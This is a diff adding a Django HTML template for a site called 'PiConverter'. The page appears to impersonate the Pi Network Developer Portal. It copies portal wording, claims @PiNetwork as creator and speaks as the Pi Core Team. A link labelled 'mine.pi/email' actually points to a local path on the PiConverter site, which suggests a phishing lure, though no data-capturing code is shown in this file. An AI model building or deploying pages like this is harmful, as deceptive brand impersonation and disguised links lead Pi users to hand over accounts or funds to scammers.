@@ -1,0 +1,188 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." /> 
+    <link rel="canonical" href="https://{{request.path_info}}" />               
+    <meta property="og:site_name" content="PiConverter" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Pi Converter, Blockchain, Community & Developer Platform | Pi Network" />
+<meta property="og:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee." />
+<meta property="og:image" content="https://PiConverter.info{% static '' %}" />
+<meta property="og:locale" content="en_us" />
+<meta property="og:url" content="https://PiConverter.info{{request.path_info}}" />
+<meta name="twitter:site" content="@PiConverter" />
+<meta name="twitter:title" content="" />
+<meta name="twitter:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." />
+<meta name="twitter:creator" content="@PiNetwork" />
+<meta name="twitter:image" content="https://{% static '' %}" />
+<meta property="twiter:card" content="summary_large_image" />
+<meta name="twitter:image:alt" content="PiConverter Logo" />
+      <link rel="stylesheet" href="{% static 'piconverterapp/styles/docs.css' %}">
+      <link rel="apple-touch-icon" sizes="180x180" href="{% static 'piconverterapp/favicon.io/apple-touch-icon.png' %}">
+      <link rel="icon" type="image/png" sizes="32x32" href="{% static 'piconverterapp/favicon.io/favicon-32x32.png' %}">
+      <link rel="icon" type="image/png" sizes="16x16" href="{% static 'piconverterapp/favicon.io/favicon-16x16.png' %}">
+      <link rel="manifest" href="{% static 'piconverterapp/favicon.io/site.webmanifest' %}">  
+
+    <title>Develop pinet</title>
+</head>
+
+<style>
+.type{
+    padding: 100px 30px;
+    box-sizing: border-box;
+    overflow: hidden;
+    color: #000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+}
+.tick{
+    letter-spacing: 1px;
+    line-height: 25px;
+    color: #141414;
+    font-weight: 400;
+    font-size: 15px;
+}
+.btns{
+    width: 90%;
+    box-sizing: border-box;
+    overflow: hidden;
+    gap: 10px;
+}
+.btns button{
+    width: 100%;
+    box-sizing: border-box;
+    overflow: hidden;
+    height: 40px;
+    border: none;
+    border-radius: 7px;
+    margin-top: 10px;
+}
+.btns button{
+    background-color: #a96ae7e7;
+    color: #fff;
+}
+.ticks{
+    width: 100%;
+    text-align: none;
+    color: rebeccapurple !important;
+    display: flex;
+    align-items: center;
+    text-decoration: none;
+}
+.ticks button{
+    border: 1px solid #a96ae7 !important;
+    color: rebeccapurple;
+    background-color: transparent !important;
+}
+.btns p{
+    text-align: center;
+    width: 100%;
+    color: rgb(228, 17, 17);
+    font-size: 15px;
+    letter-spacing: 1px;
+}
+.iig{
+    width: 30px !important;
+    height: 30px !important;
+}
+
+
+@media screen and (max-width:1000px) {
+    .btns{
+        position: absolute;
+        top: 80%;
+    }
+}
+@media screen and (max-width:700px) {
+    .type{
+        padding: 50px 20px;
+    }
+    .tick{
+        font-size: 13px;
+    }
+}
+@media screen and (max-width:550px) {
+    .tick{
+        font-size: 10px !important;
+        line-height: 20px !important;
+    }
+    .btns p{
+        font-size: 12px !important;
+    }
+    .type h2{
+        font-size: 1.2rem;
+    }
+}
+@media screen and (max-width:400px) {
+    .type h2{
+        font-size: 1rem !important;
+    }
+    .tick{
+        line-height: 15px !important;
+    }
+}
+</style>
+
+<body>
+    <header class="wallet-head">
+        <nav class="wallet-nav">
+            <a href="">
+                <button class="row">
+                    &leftarrow;
+                </button>
+            </a>
+            <aside style="display:flex; align-items:center;justify-content:center;">
+                <img class="iig" src="{% static 'piconverterapp/favicon.io/favicon.ico' %}" alt="">  Develop
+            </aside>
+        </nav>
+    </header>
+
+    <aside class="check type">
+        <h2>
+            Welcome to the Pi Developer Portal
+        </h2>
+<p class="tick">
+Here you can create third-party Pi Apps – decentralized Web 3.0 apps that can be accessed through the Pi Browser. By declaring to us your app’s URL here, your app will be able to access the Pi APIs and communicate with the Pi servers and the Pi Mainnet and Testnet Blockchains. <br>
+
+Your Pi app will be accessible directly from your own URL through the Pi Browser — you can put your app on any domain you want and still have a fully functional Pi app. <br>
+
+Currently, the Mainnet SDK is live! Developers can select either the Pi Mainnet or Pi Testnet Blockchain for their app. Though we highly recommend you start by building a functioning Testnet App and then create an associated Mainnet App. The selected blockchain will direct where API and SDK calls hit. This will allow developers to build Mainnet-compatible apps and test with users before the Mainnet goes live. <br>
+
+It is required that you own the domain of the URL that you provide! You will be asked to verify its ownership. In the future, the Pi Core Team may select popular, useful and vetted apps to be listed in the Pi Browser front page directory, possibly with a custom .pi domain, through a separate process. Regardless of your app’s progress, we encourage you to register your app here as soon as possible, so we can invite you to the Developers-only chat rooms and resources that will be released shortly. <br>
+
+</p>
+
+
+<br>
+    <br>
+    <br>
+    <br>
+
+    <aside class="btns">
+        <button disabled>
+            continue
+        </button>
+        <br>
+       <a href="/pinet/pi-apps/community-development/" class="ticks">
+        <button>
+            More info
+        </button>
+       </a>
+        <p>
+            To enter Pi Developer Portal, please verify your email by opeaning <a href="/pinet/pi-apps/community-development/">mine.pi/email</a> and then tap "continue"
+        </p>
+    </aside>
+
+    </aside>
+
+    
+</body>
+</html>
